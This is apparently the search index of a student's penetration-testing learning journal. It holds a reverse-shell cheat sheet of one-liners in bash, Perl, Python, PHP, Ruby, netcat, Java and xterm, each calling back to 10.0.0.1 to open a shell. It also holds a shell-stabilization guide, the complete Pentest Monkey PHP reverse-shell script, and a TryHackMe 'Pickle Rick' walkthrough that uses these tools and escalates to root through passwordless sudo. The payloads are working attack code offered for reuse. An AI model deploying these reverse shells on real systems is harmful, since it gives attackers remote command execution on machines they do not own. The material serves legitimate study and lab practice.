{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83c\udfda\ufe0f Welcome","text":""},{"location":"#welcome-to-my-learning-journal","title":"Welcome to my learning journal","text":"<p>My name is Ilias Takassa, and I am a final-year student in HBO-ICT with a specialization in Cyber Security at the Amsterdam University of Applied Sciences. With a strong interest in penetration testing, I am passionate about discovering vulnerabilities in systems and enhancing digital security.</p> <p>On this website, you will find a collection of my projects and knowledge within the field of penetration testing. There are Capture the Flag walkthroughs available that I have completed on Hack The Box and TryHackMe. Additionally, there is a cheat sheet that assists me in conducting penetration tests. This cheat sheet includes handy one-liners, scripts, and more.</p> <p>You can follow me on my LinkedIn and GitHub pages, which can be found here below.</p> <p>Thank you for your visit, and enjoy exploring my website!</p>"},{"location":"cheat-sheet/rev-shells/one-liners/","title":"Reverse shell One-liners","text":""},{"location":"cheat-sheet/rev-shells/one-liners/#reverse-shell-one-liners","title":"Reverse shell One-liners","text":""},{"location":"cheat-sheet/rev-shells/one-liners/#bash","title":"Bash","text":"<pre><code> bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#perl","title":"PERL","text":"<pre><code>perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#python","title":"Python","text":"<pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#php","title":"PHP","text":"<pre><code>php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#ruby","title":"Ruby","text":"<pre><code>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#netcat","title":"Netcat","text":"<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don\u2019t support the -e option.</p> <pre><code>nc -e /bin/sh 10.0.0.1 1234\n</code></pre> <p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#java","title":"Java","text":"<pre><code>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])\np.waitFor()\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#xterm","title":"xterm","text":"<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p> <pre><code>xterm -display 10.0.0.1:1\n</code></pre> <p>To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p> <pre><code>Xnest :1\n</code></pre> <p>You\u2019ll need to authorise the target to connect to you (command also run on your host):</p> <pre><code>xhost +targetip\n</code></pre>"},{"location":"cheat-sheet/rev-shells/one-liners/#credits","title":"Credits","text":"<p>These one-liners are taken from Pentest Monkey.</p>"},{"location":"cheat-sheet/rev-shells/shell-Stabilizing/","title":"Shell Stabilizing","text":""},{"location":"cheat-sheet/rev-shells/shell-Stabilizing/#shell-stabilizing","title":"Shell Stabilizing","text":""},{"location":"cheat-sheet/rev-shells/shell-Stabilizing/#prerequisites","title":"Prerequisites","text":"<p>This is a post exploitation process. Follow the steps if you have already got a reverse shell connection from the target machine. Before we begin, ensure that the target machine has Python 2 or 3 installed. This will be essential for implementing the steps outlined in this guide.</p>"},{"location":"cheat-sheet/rev-shells/shell-Stabilizing/#stabilize-your-shell","title":"Stabilize your shell","text":"<ol> <li> <p>Import the pty Module and Spawn a Bash Shell: On your target machine execute the following command: </p><pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> </li> <li> <p>Background the Process: Once the shell is spawned, you might notice that the interaction isn\u2019t entirely smooth yet. Press CTRL + Z to temporarily background the process. This will allow you to regain control of your host machine while keeping the spawned shell active on the target.</p> </li> <li> <p>Adjust Terminal Line Settings and Bring the Shell to the Foreground: To enhance the interactive experience, you\u2019ll need to tweak the terminal settings of your host machine. now run the following command in your host machine: </p><pre><code>stty raw -echo; fg\n</code></pre> This combination of commands adjusts the terminal settings to enable a smoother flow of input and output and will bring back the shell that you minimized previously. </li> <li> <p>Set the Terminal Emulator to xterm: After bringing the shell back, for optimal compatibility and usability, set the terminal emulator to xterm on your target machine using the following command: </p><pre><code>export TERM=xterm\n</code></pre> This step ensures that the system interprets the terminal environment correctly. </li> </ol>"},{"location":"cheat-sheet/rev-shells/shell-Stabilizing/#credits","title":"Credits","text":"<p>This method is taken from SAEED.</p>"},{"location":"cheat-sheet/rev-shells/scripts/php/","title":"PHP script","text":""},{"location":"cheat-sheet/rev-shells/scripts/php/#php-script","title":"PHP script","text":""},{"location":"cheat-sheet/rev-shells/scripts/php/#description","title":"Description","text":"<p>This script will make an outbound TCP connection to a hardcoded IP and port. The recipient will be given a shell running as the current user (apache normally).</p>"},{"location":"cheat-sheet/rev-shells/scripts/php/#limitations","title":"Limitations","text":"<p>proc_open and stream_set_blocking require PHP version 4.3+, or 5+ Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</p>"},{"location":"cheat-sheet/rev-shells/scripts/php/#script","title":"Script","text":"<pre><code>&lt;?php\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '127.0.0.1';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\n// Change to a safe directory\nchdir(\"/\");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?&gt; </code></pre>"},{"location":"cheat-sheet/rev-shells/scripts/php/#credits","title":"Credits","text":"<p>This script is taken from Pentest Monkey.</p>"},{"location":"ctf/htb/easy/gorilla/","title":"gorilla","text":""},{"location":"ctf/thm/easy/picklerick/","title":"Pickle Rick","text":""},{"location":"ctf/thm/easy/picklerick/#pickle-rick","title":"Pickle Rick","text":"<p>In this CTF challenge, I began by inspecting the source code of the index page. While going through the HTML file, I found a username hidden there, which I noted down. However, after a thorough search, I couldn't find anything else of interest on the webserver.</p> <p></p> <p>I ran an Nmap scan on the target. The scan revealed that ports 22 (SSH) and 80 (HTTP) were open. Unfortunately, I couldn\u2019t gather much from either service at that point, so I proceeded with a bruteforce directory and file discovery using Gobuster.</p> <p></p> <p>Running Gobuster yielded four interesting results:</p> <ul> <li>/assets directory: This contained a few files, but none of them were useful.</li> <li>/robots.txt: This contained a text string, which I saved for later.</li> <li>/login.php: Led to a login page.</li> <li>/portal.php: Also led to the same login page as /login.php.</li> </ul> <p></p> <p></p> <p>On the login page, I tried using the username I found in the source code earlier, and for the password, I used the text from robots.txt. This allowed me to log in successfully and granted me access to a command panel.</p> <p></p> <p>Once on the command panel, I executed the command \"ls\" to list the contents of the current directory. I noticed a file named Sup3rS3cretPickl3Ingred.txt. Naturally, I tried to read the file using cat, but it failed with a \u201ccommand disabled\u201d error.</p> <p></p> <p></p> <p>Next, I checked if Python was available on the system by running: python3 -c 'print(\"hello world\")'. When I received the expected \"hello world\" output, I realized it was possible to use Python for a reverse shell.</p> <p></p> <p>I used my cheat sheet to find a suitable Python one-liner for a reverse shell, which can be found here. Before executing it, I set up a listener on my machine using netcat.</p> <p></p> <p>Then, I executed the Python one-liner on the command panel, which gave me a reverse shell on the target machine.</p> <p></p> <p>The initial reverse shell was quite unstable. To stabilize the shell, I followed the standard process for upgrading it, which involves using Python to spawn a fully interactive TTY shell. This ensures smoother command execution and interaction with the system. You can find more about shell stabilization here.</p> <p>Once the shell was stabilized, I was able to easily read Sup3rS3cretPickl3Ingred.txt, finding the first ingredient. In the same directory, I discovered a clue.txt file that instructed me to \"look around the file system for the other ingredient.\"</p> <p></p> <p></p> <p>Following the clue, I navigated to the /home directory to check for other user folders. I found a user named rick, and after accessing his folder, I found the second ingredient.</p> <p></p> <p>Now, I needed to perform privilege escalation to gain root access and find the final ingredient. I ran the following command to check my sudo privileges: sudo -l. The output showed that the www-data user could run all commands as root without a password. This means that the www-data user has full sudo privileges without needing to enter a password. With this configuration, I could simply run: sudo su, And become root.</p> <p></p> <p>As root, I navigated to the /root directory, where I found the third and final ingredient needed to complete the challenge</p> <p></p>"}]}